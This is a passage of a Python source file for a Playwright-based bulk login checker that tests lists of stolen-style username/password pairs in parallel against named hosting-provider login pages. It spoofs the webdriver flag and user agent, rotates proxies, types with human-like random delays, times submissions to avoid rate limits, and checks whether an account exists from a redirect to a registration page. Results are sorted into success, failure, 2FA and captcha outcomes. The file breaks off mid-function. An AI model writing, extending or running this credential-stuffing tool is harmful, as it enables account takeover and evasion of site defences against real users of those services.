#   3. Waiting for the form to render    (~0.5–2 s)
#
# The pool keeps ONE headless browser + page alive per login URL.  Those
# three steps are paid ONCE; each subsequent credential just:
#   fill → submit → evaluate → navigate back
#
# Thread safety
# -------------
# _browser_pool_lock  — guards the dict itself (insert / lookup / evict)
# _PoolSlot.lock      — serialises per-URL page use so two threads don't
#                       corrupt a shared page simultaneously.
#                       (Each URL slot is used by one thread at a time;
#                        different URLs can run fully in parallel.)
# ---------------------------------------------------------------------------

@dataclasses.dataclass
class _PoolSlot:
    """One persistent headless browser session for a specific login URL."""
    playwright_inst: Any                   # sync_playwright .start() result
    browser:         Any                   # Playwright Browser
    context:         Any                   # Playwright BrowserContext
    page:            Any                   # Playwright Page (kept on login page)
    login_url:       str
    proxy_server:    str = ""
    cookie_dismissed: bool = False         # True once the cookie banner was clicked
    lock: threading.Lock = dataclasses.field(default_factory=threading.Lock)


_browser_pool: dict[tuple[str, str], "_PoolSlot"] = {}
_browser_pool_lock = threading.Lock()

_POOL_LAUNCH_ARGS = [
    "--disable-blink-features=AutomationControlled",
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-extensions",
    "--disable-background-networking",
    "--disable-sync",
    "--disable-translate",
    "--mute-audio",
    "--blink-settings=imagesEnabled=false",
]

_POOL_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)


def _ensure_pool_slot(login_url: str,
                      proxy: dict | None = None,
                      locale: str = "en-US",
                      timezone_id: str = "Europe/London") -> "_PoolSlot":
    """
    Return (lazily creating) a shared headless browser for *login_url*.

    First call: launches Chromium, navigates to the login page, waits for
    the form to render.  Subsequent calls return the cached slot instantly.

    Raises on navigation failure so the caller can return UNREACHABLE/TIMEOUT.
    """
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

    proxy_server = ""
    if proxy:
        proxy_server = str(proxy.get("server") or "")
    pool_key = (login_url, proxy_server)

    with _browser_pool_lock:
        slot = _browser_pool.get(pool_key)
        if slot is not None:
            return slot

        if proxy_server:
            print(f"[POOL] Launching shared browser → {login_url} via {proxy_server}")
        else:
            print(f"[POOL] Launching shared browser → {login_url} (no proxy)")
        pw_inst = sync_playwright().start()
        launch_args: dict[str, Any] = {"headless": True, "args": _POOL_LAUNCH_ARGS}
        if proxy:
            launch_args["proxy"] = proxy
        browser = pw_inst.chromium.launch(**launch_args)
        context = browser.new_context(
            user_agent=_POOL_UA,
            locale=locale,
            timezone_id=timezone_id,
            java_script_enabled=True,
        )
        context.route(
            "**/*.{png,jpg,jpeg,gif,webp,svg,woff,woff2,ttf,eot,mp4,mp3}",
            lambda r: r.abort(),
        )
        page = context.new_page()
        page.add_init_script(
            "Object.defineProperty(navigator,'webdriver',{get:()=>false});"
        )

        # Navigate to the login page once and wait for the form
        try:
            page.goto(login_url, timeout=30_000, wait_until="domcontentloaded")
            try:
                page.wait_for_load_state("networkidle", timeout=15_000)
            except PWTimeout:
                pass
            try:
                page.wait_for_selector("input", timeout=15_000, state="visible")
            except PWTimeout:
                pass
        except Exception:
            _cleanup_context(context)
            try:
                if browser:
                    browser.close()
            except Exception:
                pass
            try:
                pw_inst.stop()
            except Exception:
                pass
            raise

        slot = _PoolSlot(
            playwright_inst=pw_inst,
            browser=browser,
            context=context,
            page=page,
            login_url=login_url,
            proxy_server=proxy_server,
        )
        _browser_pool[pool_key] = slot
        print(f"[POOL] Slot ready → {login_url} ({proxy_server or 'no proxy'})")
        return slot


def _pool_evict(login_url_or_key: str | tuple[str, str]) -> None:
    """Remove and close pool slot(s) by login_url or exact pool key."""
    with _browser_pool_lock:
        keys_to_remove: list[tuple[str, str]] = []
        if isinstance(login_url_or_key, tuple):
            if login_url_or_key in _browser_pool:
                keys_to_remove.append(login_url_or_key)
        else:
            keys_to_remove = [k for k in _browser_pool.keys() if k[0] == login_url_or_key]
        slots = [_browser_pool.pop(k) for k in keys_to_remove]
    if not slots:
        return
    for slot in slots:
        for closer in (slot.context.close, slot.browser.close, slot.playwright_inst.stop):
            try:
                closer()
            except Exception:
                pass
        print(f"[POOL] Evicted slot → {slot.login_url} ({slot.proxy_server or 'no proxy'})")


def release_browser_pool() -> None:
    """
    Close every shared browser session and clear the pool.
    Call after a check run finishes or is stopped to free OS resources.
    """
    with _browser_pool_lock:
        keys = list(_browser_pool.keys())

    for key in keys:
        _pool_evict(key)

    print("[POOL] All shared browsers released.")


def _pool_return_to_login(slot: "_PoolSlot", timeout_ms: int = 20_000) -> bool:
    """
    After evaluating a credential, navigate the shared page back to the
    login URL so it is ready for the next credential.
    Returns False if the page/browser died (slot should be evicted).
    """
    from playwright.sync_api import TimeoutError as PWTimeout
    try:
        current = slot.page.url.rstrip("/")
        target  = slot.login_url.rstrip("/")
        if current == target:
            # Already on login page — ensure the form is still rendered
            try:
                slot.page.wait_for_selector("input", timeout=4_000, state="visible")
                # Still dismiss any overlay that may have appeared (e.g. after a
                # successful login redirected back, or a re-triggered consent popup)
                _dismiss_overlays(slot.page)
                return True
            except PWTimeout:
                pass  # fall through to reload

        slot.page.goto(slot.login_url, timeout=timeout_ms,
                       wait_until="domcontentloaded")
        try:
            slot.page.wait_for_load_state("networkidle", timeout=10_000)
        except PWTimeout:
            pass
        try:
            slot.page.wait_for_selector("input", timeout=10_000, state="visible")
        except PWTimeout:
            pass
        # Dismiss any cookie / privacy banner present on the freshly-loaded page
        _dismiss_overlays(slot.page)
        return True
    except Exception as exc:
        print(f"[POOL] return_to_login failed: {exc}")
        return False


def _find_visible_selector(page, selectors: list[str], timeout_ms: int = 3_000) -> str | None:
    """
    Return the first selector from *selectors* that resolves to at least one
    VISIBLE element on *page*, or None if nothing matched.

    Uses wait_for_selector so it is safe even when the DOM is still rendering.
    We keep per-selector timeout short (default 3s) because we iterate the full
    list and we only need ONE to succeed.
    """
    for sel in selectors:
        try:
            loc = page.locator(sel).first
            if loc.count() == 0:
                continue
            if not loc.is_visible(timeout=timeout_ms):
                continue
            if _looks_like_social_auth_element(loc):
                print(f"[SELECTOR] Skipping social auth selector: {sel}")
                continue
            print(f"[SELECTOR] Using visible selector: {sel}")
            return sel
        except Exception:
            continue
    return None


def _wait_for_page_ready(page, nav_timeout_s: int) -> None:
    """
    Robustly wait for a page to be fully interactive.
    Strategy (mirrors the working dedicated handlers):
      1. domcontentloaded  — HTML parsed
      2. networkidle       — JS loading spinners finished
      3. at least one <input> visible — form has rendered
    All steps are best-effort; we never hard-fail here.
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    try:
        page.wait_for_load_state("domcontentloaded", timeout=nav_timeout_s * 1000)
    except PWTimeout:
        print("[WAIT] domcontentloaded timed out — continuing")

    print("[WAIT] Waiting for networkidle (up to 20s)...")
    try:
        page.wait_for_load_state("networkidle", timeout=20_000)
    except PWTimeout:
        print("[WAIT] networkidle timed out — continuing")

    print("[WAIT] Waiting for an <input> to become visible (up to 20s)...")
    try:
        page.wait_for_selector("input", timeout=20_000, state="visible")
    except PWTimeout:
        print("[WAIT] No <input> visible after 20s")


def _prepare_turkticaret_login_gate(
    page,
    login_url: str,
    username: str,
    nav_timeout: int = 60,
) -> bool:
    """
    turkticaret.net uses a 2-step auth flow:
      1) enter email/user id
      2) redirect to login (or register when user does not exist)
    Returns False when it redirects to register.
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    def _is_turkticaret_user_entry_url(url: str) -> bool:
        u = (url or "").lower()
        return ("turkticaret.net" in u and "/usermanage/userlogin.php" in u)

    current_url = ""
    try:
        current_url = page.url or ""
    except Exception:
        current_url = ""
    if not (_is_turkticaret_user_entry_url(login_url) or _is_turkticaret_user_entry_url(current_url)):
        return True

    # Already on step-2 login form.
    try:
        if page.is_visible("input[type='password']", timeout=1_200):
            return True
    except Exception:
        pass

    user_entry_sel = _find_visible_selector(
        page,
        [
            "input[type='email']",
            "input[name='email']",
            "input[name='username']",
            "input[name='login']",
            "input[type='text']",
        ],
        timeout_ms=4_000,
    )
    if not user_entry_sel:
        return True

    print("[TURKTICARET] Step 1: entering user/email before password page")
    try:
        page.fill(user_entry_sel, "")
        _random_delay(0.2, 0.5)
        page.type(user_entry_sel, username, delay=random.randint(50, 120))
    except Exception as exc:
        print(f"[TURKTICARET] Could not fill first-step user/email: {exc}")
        return False

    submit_sel = _find_visible_selector(
        page,
        [
            "button[type='submit']",
            "input[type='submit']",
            "button:has-text('Devam')",
            "button:has-text('Continue')",
            "button:has-text('Giriş')",
            "a:has-text('Devam')",
        ],
        timeout_ms=3_000,
    )
    try:
        if submit_sel:
            try:
                with page.expect_navigation(
                    timeout=nav_timeout * 1000, wait_until="domcontentloaded"
                ):
                    _click_first_non_social(page, submit_sel, timeout_ms=3_000)
            except PWTimeout:
                _click_first_non_social(page, submit_sel, timeout_ms=2_000)
        else:
            page.press(user_entry_sel, "Enter")
    except Exception:
        pass

    try:
        page.wait_for_timeout(700)
    except Exception:
        pass

    now = ""
    try:
        now = (page.url or "").lower()
    except Exception:
        pass
    if "turkticaret.net" in now and ("register" in now or "signup" in now or "kayit" in now):
        print("[TURKTICARET] User/email not registered (redirected to register)")
        return False

    try:
        page.wait_for_selector("input[type='password']", timeout=8_000, state="visible")
    except PWTimeout:
        pass
    return True


def _is_turkticaret_login_step2(url: str) -> bool:
    u = (url or "").lower()
    return ("turkticaret.net" in u and "/usermanage/login.php" in u)


def _generic_fill_and_submit(
    page,
    login_url: str,
    username: str,
    password: str,
    nav_timeout: int = 60,
    verbose: bool = False,
    custom_user_sel: "str | None" = None,
    custom_pass_sel: "str | None" = None,
    custom_submit_sel: "str | None" = None,
    custom_cookie_sel: "str | None" = None,
    custom_login_trigger_sel: "str | None" = None,
    custom_login_tab_sel: "str | None" = None,
) -> bool:
    """
    Module-level helper: detect form fields, fill credentials, and click submit.

    Identical logic to the ``_fill_and_submit`` closure inside
    ``try_login_interactive`` — extracted so that ``scrape_after_login`` and
    any future callers can reuse the exact same strategy (selector cache,
    ``_find_visible_selector``, ``page.type`` human delays,
    ``expect_navigation`` wrapping the click).

    Returns True if the form was filled and submit was attempted; False if the
    username or password field could not be found.
    """
    from playwright.sync_api import TimeoutError as PWTimeout

    # ── Step 1: Wait for initial DOM + network load ────────────────────────
    try:
        page.wait_for_load_state("domcontentloaded", timeout=nav_timeout * 1_000)
    except PWTimeout:
        pass
    try:
        page.wait_for_load_state("networkidle", timeout=20_000)
    except PWTimeout:
        pass
    print(f"[Wait for paged is loaded] domcontentloaded + networkidle done (or timed out)")
    # ── Step 2: Dismiss cookie/consent overlays FIRST ────────────────────
    # Must happen before any form-field detection: the modal may contain its
    # own <input> checkboxes that would confuse field detection, and its
    # z-index layer can intercept clicks aimed at the login form.
    _dismiss_overlays(page, custom_cookie_sel=custom_cookie_sel)

    # ── Step 2a: Hostico panel normalization ──────────────────────────────
    # hostico.ro/client may open on Sign Up by default; force selectors to the
    # `clientlogin` form so credential checks do not target registration fields.
    hostico_user_sel, hostico_pass_sel, hostico_submit_sel = _prepare_hostico_login_panel(
        page,
        timeout_ms=min(nav_timeout * 1_000, 15_000),
    )
    if hostico_user_sel and not custom_user_sel:
        custom_user_sel = hostico_user_sel
    if hostico_pass_sel and not custom_pass_sel:
        custom_pass_sel = hostico_pass_sel
    if hostico_submit_sel and not custom_submit_sel:
        custom_submit_sel = hostico_submit_sel

    # ── Step 2b: Open login modal / dropdown if form is not directly on page ──
    # Sites like akky.mx show only a login button on the main page; the form
    # lives inside a modal that is revealed only after the button is clicked.
    _try_open_login_modal(
        page,
        timeout_ms=nav_timeout * 1_000,
        custom_user_sel=custom_user_sel,
        custom_pass_sel=custom_pass_sel,
        custom_trigger_sel=custom_login_trigger_sel,
        custom_login_tab_sel=custom_login_tab_sel,
    )

    # ── Step 2c: turkticaret first-step user/email gate ────────────────────
    if not _prepare_turkticaret_login_gate(
        page=page, login_url=login_url, username=username, nav_timeout=nav_timeout
    ):
        return False

    # ── Step 3: Wait for a real credential input to be accessible ─────────
    # Explicitly exclude checkboxes/radios so modal inputs don't satisfy
    # this check — we need the actual username/password fields visible.
    try:
        page.wait_for_selector(
            "input[type='text'], input[type='email'], input[type='password']",
            timeout=10_000, state="visible"
        )
    except PWTimeout:
        pass

    # ── Resolve selectors (custom DOM settings → cache → fresh detection) ───
    _now_url = ""
    try:
        _now_url = page.url or ""
    except Exception:
        _now_url = ""
    _is_turkticaret_step2 = _is_turkticaret_login_step2(_now_url)

    # Custom selectors always win — check them against the live page first.
    if custom_user_sel:
        user_sel = custom_user_sel if _find_visible_selector(page, [custom_user_sel], timeout_ms=3_000) else None
    else:
        user_sel = None

    if custom_pass_sel:
        pass_sel = custom_pass_sel if _find_visible_selector(page, [custom_pass_sel], timeout_ms=3_000) else None
    else:
        pass_sel = None

    if custom_submit_sel:
        submit_sel = custom_submit_sel if _find_visible_selector(page, [custom_submit_sel], timeout_ms=3_000) else None
    else:
        submit_sel = None

    if _is_turkticaret_step2 and not submit_sel:
        submit_sel = _find_visible_selector(
            page,
            [
                "button#submitBtn",
                "button[onclick*='signIn']",
                "button:has-text('Giriş yap')",
                "button:has-text('Giriş Yap')",
                "button[type='submit']",
            ],
            timeout_ms=3_000,
        )

    # Fall back to cache / auto-detection for any field not covered by custom settings
    if not user_sel or not pass_sel:
        cached = _get_cached_selectors(login_url)
        if cached:
            if not user_sel:
                user_sel = cached.user_sel
            if not pass_sel:
                pass_sel = cached.pass_sel
            if not submit_sel:
                submit_sel = cached.submit_sel
            if verbose:
                print(f"[CACHE HIT] user={user_sel}, pass={pass_sel}, submit={submit_sel}")
        else:
            html = page.content()
            bs_user, bs_pass = _detect_fields(html)

            if verbose:
                print(f"[DETECTION] BeautifulSoup found: user={bs_user}, pass={bs_pass}")

            user_candidates = [f"input[name='{bs_user}']"] + _USER_FIELD_SELECTORS
            pass_candidates = [f"input[name='{bs_pass}']"] + _PASS_FIELD_SELECTORS

            # Remove duplicates while preserving order
            seen: set = set()
            user_candidates = [s for s in user_candidates
                               if not (s in seen or seen.add(s))]  # type: ignore[func-returns-value]
            seen = set()
            pass_candidates = [s for s in pass_candidates
                               if not (s in seen or seen.add(s))]  # type: ignore[func-returns-value]

            if not user_sel:
                user_sel = _find_visible_selector(page, user_candidates, timeout_ms=3_000)
            if not pass_sel:
                pass_sel = _find_visible_selector(page, pass_candidates, timeout_ms=3_000)
            if not submit_sel:
                submit_sel = _find_visible_selector(page, _SUBMIT_SELECTORS, timeout_ms=3_000)

            if verbose:
                print(f"[SELECTORS] user={user_sel}, pass={pass_sel}, submit={submit_sel}")

            if user_sel and pass_sel:
                _set_cached_selectors(login_url, _FormSelectors(
                    user_sel   = user_sel,
                    pass_sel   = pass_sel,
                    submit_sel = submit_sel or "button[type='submit']",
                ))

    if verbose:
        print(f"[FINAL SELECTORS] user={user_sel}, pass={pass_sel}, submit={submit_sel}")

    if (not pass_sel) or (not user_sel and not _is_turkticaret_step2):
        if verbose:
            print(f"[ERROR] Could not find form fields: user_sel={user_sel}, pass_sel={pass_sel}")
            # Debug: show all inputs found
            html = page.content()
            soup = BeautifulSoup(html, "html.parser")
            inputs = soup.find_all("input")
            print(f"[DEBUG] Found {len(inputs)} input elements on page:")
            for i, inp in enumerate(inputs[:10], 1):
                print(f"  [{i}] type={inp.get('type')}, name={inp.get('name')}, id={inp.get('id')}")
        return False

    # ── Fill username (optional on turkticaret step-2) ────────────────────
    if user_sel:
        try:
            page.wait_for_selector(user_sel, state="visible", timeout=5_000)
            page.fill(user_sel, "")
            _random_delay(0.3, 0.6)
            page.type(user_sel, username, delay=random.randint(60, 150))
            if verbose:
                print(f"[FILLED] username into {user_sel}")
        except Exception as e:
            if verbose:
                print(f"[ERROR] Failed to fill username: {e}")
            if not _is_turkticaret_step2:
                return False
    _random_delay(0.4, 0.8)

    # ── Fill password ─────────────────────────────────────────────────────
    try:
        page.wait_for_selector(pass_sel, state="visible", timeout=5_000)
        page.fill(pass_sel, "")
        _random_delay(0.3, 0.6)
        page.type(pass_sel, password, delay=random.randint(60, 150))
        if verbose:
            print(f"[FILLED] password into {pass_sel}")
    except Exception as e:
        if verbose:
            print(f"[ERROR] Failed to fill password: {e}")
        return False

    _random_delay(0.4, 0.9)

    # ── Wait 2 s after filling credentials before clicking submit ─────────
    # Gives JS validation / SPA frameworks time to process the filled values
    # and avoids triggering rate-limiting on sites like guzel.net.tr.
    time.sleep(2.0)

    # ── Submit (prefer click+expect_navigation; fall back to Enter) ───────
    print(f"[SUBMIT] Attempting to submit the form...")
    if not submit_sel and not custom_submit_sel:
        submit_sel = _find_visible_selector(page, _SUBMIT_SELECTORS, timeout_ms=3_000)

    if submit_sel:
        try:
            if verbose:
                print(f"[SUBMIT] Clicking {submit_sel}")
            with page.expect_navigation(
                timeout=nav_timeout * 1000, wait_until="domcontentloaded"
            ):
                if not _click_first_non_social(page, submit_sel, timeout_ms=3_000):
                    raise RuntimeError("no safe non-social submit candidate")
        except PWTimeout:
            if verbose:
                print(f"[SUBMIT] No full navigation (SPA/AJAX login)")
            pass   # SPA / AJAX login — no full navigation, that is fine
        except Exception as e:
            if verbose:
                print(f"[SUBMIT] Click error: {e}")
            pass
    else:
        try:
            if verbose:
                print(f"[SUBMIT] Using Enter key")
            page.keyboard.press("Enter")
        except Exception as e:
            if verbose:
                print(f"[ERROR] Failed to press Enter: {e}")
            return False

    return True


# ─────────────────────────────────────────────────────────────────────────────
# GLOBAL PARALLEL CREDENTIAL CHECKER INTEGRATION
# ─────────────────────────────────────────────────────────────────────────────
# High-performance batch processing with request interception & 2FA detection

def try_login_batch_parallel(
    entries: list[dict],
    max_workers: int = 5,
    timeout: int = 15,
    headless: bool = True,
    custom_login_url: str = "",
    progress_callback = None,
) -> dict:
    """
    Check multiple credentials in parallel with advanced detection.

    Parameters
    ----------
    entries : list[dict]
        List of {username, password, url, domain} dicts
    max_workers : int
        Number of concurrent threads (default 5 for stability)
    timeout : int
        Seconds to wait per credential check
    headless : bool
        Run browsers in headless mode (faster)
    custom_login_url : str
        Override all entries' URLs with this
    progress_callback : callable
        Function(str) called with progress messages

    Returns
    -------
    dict : {username: (result, details_dict)}
        result = "SUCCESS" | "FAILED" | "2FA_REQUIRED" | "UNREACHABLE" | etc
        details_dict = {
            "2fa_detected": bool,
            "captcha_detected": bool,
            "auth_requests": list of API calls,
            "network_events": count,
            "final_url": str,
            "error": str (if any),
        }
    
    Example
    -------
    >>> creds = [
    ...     {"username": "user1", "password": "pass1", "url": "https://login.example.com"},
    ...     {"username": "user2", "password": "pass2", "url": "https://login.example.com"},
    ... ]
    >>> results = try_login_batch_parallel(creds, max_workers=4)
    >>> for user, (status, details) in results.items():
    ...     print(f"{user}: {status}")
    """
    from src.advanced_checker import GlobalCredentialChecker
    
    proxy_file = PROXY_FILE if PROXY_FILE.exists() else None
    
    checker = GlobalCredentialChecker(
        max_workers=max_workers,
        timeout=timeout,
        headless=headless,
        progress_callback=progress_callback,
        browser_executable=get_browser_executable(),
        proxy_file=proxy_file,
    )
    
    # Prepare entries with login URLs
    prepared_entries = []
    for entry in entries:
        e = entry.copy()
        if custom_login_url:
            e["url"] = custom_login_url
        elif "url" not in e or not e["url"]:
            # Try to detect URL from domain
            domain = e.get("domain", "").lower()
            if "superhosting" in domain:
                e["url"] = SUPERHOSTING_LOGIN_URL
            elif "zettahost" in domain:
                e["url"] = ZETTAHOST_LOGIN_URL
            elif "ns1" in domain:
                e["url"] = NS1_LOGIN_URL
            elif "hostpoint" in domain:
                e["url"] = HOSTPOINT_LOGIN_URL
            elif "home.pl" in domain:
                e["url"] = HOME_PL_LOGIN_URL
            elif "cyberfolks" in domain:
                e["url"] = CYBERFOLKS_LOGIN_URL
            else:
                continue  # skip if no URL
        prepared_entries.append(e)
    
    if progress_callback:
        progress_callback(f"Starting parallel check of {len(prepared_entries)} credentials...")
    
    return checker.check_credentials_batch(prepared_entries)


def get_batch_summary(results: dict) -> dict:
    """
    Get summary statistics from batch check results.

    Parameters
    ----------
    results : dict
        Output from try_login_batch_parallel()

    Returns
    -------
    dict with summary counts by status
    """
    summary = {
        "total": len(results),
        "success": 0,
        "failed": 0,
        "2fa": 0,
        "captcha": 0,
        "timeout": 0,
        "unreachable": 0,
        "error": 0,
    }
    
    for result, details in results.values():
        if result == "SUCCESS":
            summary["success"] += 1
        elif result == "FAILED":
            summary["failed"] += 1
        elif result == "2FA_REQUIRED":
            summary["2fa"] += 1
        elif result == "CAPTCHA":
            summary["captcha"] += 1
        elif result == "TIMEOUT":
            summary["timeout"] += 1
        elif result == "UNREACHABLE":
            summary["unreachable"] += 1
        else:
            summary["error"] += 1
    
    return summary


# ─────────────────────────────────────────────────────────────────────────────
# FAST LOGIN CHECKER
# ─────────────────────────────────────────────────────────────────────────────
# Simple linear flow: navigate → fill → submit → delay → check result

# JavaScript that scans a list of CSS selectors and returns the first one
# whose element exists AND has a non-zero bounding box (i.e. is visible).
# Single round-trip to the browser is ~100x faster than one wait_for_selector
# call per selector (which incurs a 2-3 s timeout overhead per miss).
_JS_FIND_SELECTOR = """
(selectors) => {
    const socialMarkers = ['facebook', 'google', 'linkedin', 'apple', 'microsoft', 'twitter', 'github', 'discord', 'oauth', 'social'];
    const isSocialAuth = (el) => {
        if (!el) return false;
        const txt = (el.innerText || el.textContent || '').toLowerCase();
        const href = (el.getAttribute && (el.getAttribute('href') || '').toLowerCase()) || '';
        const cls = ((el.className || '') + '').toLowerCase();
        const dataSocial = (el.getAttribute && (el.getAttribute('data-social') || '').toLowerCase()) || '';
        if (dataSocial) return true;
        const s = `${txt} ${href} ${cls} ${dataSocial}`;
        return socialMarkers.some(m => s.includes(m));
    };
    for (const sel of selectors) {
        try {
            const nodes = document.querySelectorAll(sel);
            for (const el of nodes) {
                if (isSocialAuth(el)) continue;
                const r = el.getBoundingClientRect();
                if (r.width > 0 && r.height > 0) return sel;
            }
        } catch(e) {}
    }
    return null;
}
"""

# JavaScript that finds a logout link/button by href keyword or text content.
_JS_FIND_LOGOUT = """
() => {
    const kws = ['logout', 'signout', 'sign-out', 'log-out'];
    // 1. href-based links
    for (const a of document.querySelectorAll('a[href]')) {
        const h = (a.getAttribute('href') || '').toLowerCase();
        if (kws.some(k => h.includes(k))) { a.click(); return true; }
    }
    // 2. text-based elements
    for (const el of document.querySelectorAll('a, button')) {
        const t = (el.innerText || el.textContent || '').trim().toLowerCase();
        if (kws.some(k => t === k || t.includes(k))) { el.click(); return true; }
    }
    return false;
}
"""


def _html_to_css_selector(html: str) -> str | None:
    """
    Convert a pasted HTML element snippet to a CSS selector.

    Supports tag, id, class, name, type attributes — enough to uniquely
    identify a login field or button from a copy-pasted element.

    Examples
    --------
    <button class="SolidButton loginAuth__button SolidButton--width-full">Login</button>
      → button.SolidButton.loginAuth__button.SolidButton--width-full

    <input name="email" type="email" id="login-email" class="NXInput">
      → input#login-email.NXInput[name="email"][type="email"]

    Returns None if *html* is blank or cannot be parsed.
    """
    import re as _re
    html = html.strip()
    if not html:
        return None
    m = _re.match(r'<(\w+)([^>]*?)(?:\s*/?>|>)', html, _re.DOTALL | _re.IGNORECASE)
    if not m:
        return None
    tag   = m.group(1).lower()
    attrs = m.group(2)

    sel = tag

    id_m = _re.search(r'''\bid=["']([^"']*)["']''', attrs, _re.IGNORECASE)
    if id_m:
        sel += f'#{id_m.group(1)}'

    cls_m = _re.search(r'''\bclass=["']([^"']*)["']''', attrs, _re.IGNORECASE)
    if cls_m:
        classes = cls_m.group(1).split()
        sel += ''.join(f'.{c}' for c in classes if c)

    name_m = _re.search(r'''\bname=["']([^"']*)["']''', attrs, _re.IGNORECASE)
    if name_m:
        sel += f'[name="{name_m.group(1)}"]'

    type_m = _re.search(r'''\btype=["']([^"']*)["']''', attrs, _re.IGNORECASE)
    if type_m:
        sel += f'[type="{type_m.group(1)}"]'

    return sel or None


def _selector_candidates_from_html(html: str) -> list[str]:
    """
    Build robust CSS selector candidates from a pasted HTML element snippet.
    Starts with the strict selector, then adds looser id/name-based fallbacks.
    """
    import re as _re

    html = (html or "").strip()
    if not html:
        return []

    strict = _html_to_css_selector(html)
    m = _re.match(r'<(\w+)([^>]*?)(?:\s*/?>|>)', html, _re.DOTALL | _re.IGNORECASE)
    if not m:
        return [strict] if strict else []

    tag = m.group(1).lower()
    attrs = m.group(2)

    id_m = _re.search(r'''\bid=["']([^"']+)["']''', attrs, _re.IGNORECASE)
    name_m = _re.search(r'''\bname=["']([^"']+)["']''', attrs, _re.IGNORECASE)
    type_m = _re.search(r'''\btype=["']([^"']+)["']''', attrs, _re.IGNORECASE)
    cls_m = _re.search(r'''\bclass=["']([^"']+)["']''', attrs, _re.IGNORECASE)

    cands: list[str] = []
    if strict:
        cands.append(strict)

    if id_m:
        _id = id_m.group(1)
        cands.extend([f"#{_id}", f"{tag}#{_id}"])

    if name_m:
        _name = name_m.group(1)
        cands.extend([f'{tag}[name="{_name}"]', f'[name="{_name}"]'])
        if tag != "input":
            cands.append(f'input[name="{_name}"]')
        if type_m:
            _type = type_m.group(1)
            cands.append(f'{tag}[name="{_name}"][type="{_type}"]')

    # De-dup while preserving order
    out: list[str] = []
    seen: set[str] = set()
    for s in cands:
        if not s or s in seen:
            continue
        out.append(s)
        seen.add(s)
    return out


_JS_FIND_EXISTING_SELECTOR = """
(selectors) => {
    for (const sel of selectors) {
        try {
            if (document.querySelector(sel)) return sel;
        } catch (e) {}
    }
    return null;
}
"""


def _js_find_existing_selector(page, selectors: list[str]) -> str | None:
    """Return first selector that exists in DOM (visibility not required)."""
    try:
        return page.evaluate(_JS_FIND_EXISTING_SELECTOR, selectors)
    except Exception:
        return None


def _resolve_custom_dom_selector(page, custom_dom: str, label: str) -> str | None:
    """
    Resolve user-provided custom DOM (HTML snippet or CSS selector) to a
    working selector on the current page.
    """
    raw = (custom_dom or "").strip()
    if not raw:
        return None

    if raw.startswith("<"):
        candidates = _selector_candidates_from_html(raw)
    else:
        candidates = [raw]

    if not candidates:
        return None

    visible_sel = _js_find_selector(page, candidates)
    if visible_sel:
        print(f"[DOM] Resolved {label} selector (visible): {visible_sel}")
        return visible_sel

    existing_sel = _js_find_existing_selector(page, candidates)
    if existing_sel:
        print(f"[DOM] Resolved {label} selector (exists, not yet visible): {existing_sel}")
        return existing_sel

    print(f"[DOM] Could not resolve {label} selector from custom DOM")
    return None


def _js_find_selector(page, selectors: list[str]) -> str | None:
    """Return the first CSS selector from *selectors* that matches a visible
    element on *page*, using a single JavaScript round-trip.  Returns None if
    nothing matched.  Does NOT wait — call after the page has loaded."""
    try:
        return page.evaluate(_JS_FIND_SELECTOR, selectors)
    except Exception:
        return None


def _try_logout(page) -> bool:
    """Best-effort logout: click a logout link/button and clear cookies.
    Returns True if a logout element was found and clicked."""
    try:
        return bool(page.evaluate(_JS_FIND_LOGOUT))
    except Exception:
        return False


# ── Keywords used by the network response evaluator ──────────────────────────

_NET_AUTH_URL_KEYWORDS = (
    "login", "auth", "signin", "sign-in", "session", "token",
    "credential", "account", "password", "passwd", "oauth", "jwt",
)

_NET_SUCCESS_BODY_WORDS = (
    "\"token\"", "\"access_token\"", "\"bearer\"", "\"user\"",
    "\"id\"", "\"dashboard\"", "\"redirect\"", "success",
    "logged_in", "logged-in",
)

_NET_FAILED_BODY_WORDS = (
    "invalid", "incorrect", "failed", "unauthorized", "unauthenticated",
    "error", "wrong", "bad credential", "mismatch", "not found",
    "blocked", "suspended", "locked",
)


def _setup_response_monitor(page) -> list:
    """Register a Playwright response listener on *page* that captures
    POST responses to likely authentication endpoints.

    Returns a mutable list; each entry is a dict with keys:
        status  (int)
        url     (str)
        body    (str – first 1 024 chars, may be empty on error)

    The listener fires automatically while Playwright processes events,
    so just call this before navigating / clicking submit and the list
    will be populated by the time you check it.

    Why this matters for SPAs
    ─────────────────────────
    Chrome's DevTools show all network traffic, but Playwright's default
    page evaluation can't read the *response body* of Fetch/XHR requests
    that already completed — it only sees the DOM.  For React / Vue / SPA
    login pages the HTML never changes on failure; the app just re-renders.
    Playwright's ``page.on("response", …)`` fires in real-time and CAN read
    the response body, giving us the ground truth from the HTTP API layer.
    """
    captured: list = []

    def _on_response(response):
        try:
            if response.request.method not in ("POST", "PUT", "PATCH"):
                return
            url_lower = response.url.lower()
            if not any(kw in url_lower for kw in _NET_AUTH_URL_KEYWORDS):
                return
            status = response.status
            try:
                body = response.text()[:1_024]
            except Exception:
                body = ""
            captured.append({"status": status, "url": response.url, "body": body})
            print(f"[NET] Captured auth response  {status}  {response.url[:80]}")
        except Exception:
            pass

    page.on("response", _on_response)
    return captured


def _evaluate_network_result(captured: list) -> "str | None":
    """Analyse captured login API responses.

    Priority order:
      1.  HTTP 4xx / 5xx  → FAILED
      2.  HTTP 200 with obvious token / user JSON keys → SUCCESS
      3.  HTTP 200 with obvious error words → FAILED
      4.  HTTP 3xx redirect → SUCCESS (server-side redirect after login)
      5.  Nothing conclusive → None  (fall through to DOM detection)
    """
    if not captured:
        return None

    for r in captured:
        status     = r["status"]
        body_lower = r["body"].lower()

        if status in (401, 403, 404, 422, 429, 500):
            print(f"[NET] Auth endpoint returned {status} → FAILED")
            return "FAILED"

        if status in (301, 302, 303, 307, 308):
            print(f"[NET] Auth endpoint returned {status} redirect → SUCCESS")
            return "SUCCESS"

        if status == 200:
            if any(w in body_lower for w in _NET_SUCCESS_BODY_WORDS):
                print(f"[NET] Auth endpoint 200 with success indicators → SUCCESS")
                return "SUCCESS"
            if any(w in body_lower for w in _NET_FAILED_BODY_WORDS):
                print(f"[NET] Auth endpoint 200 with failure indicators → FAILED")
                return "FAILED"

    return None  # inconclusive — let DOM detection decide


def _setup_network_tracker(page) -> dict:
    """
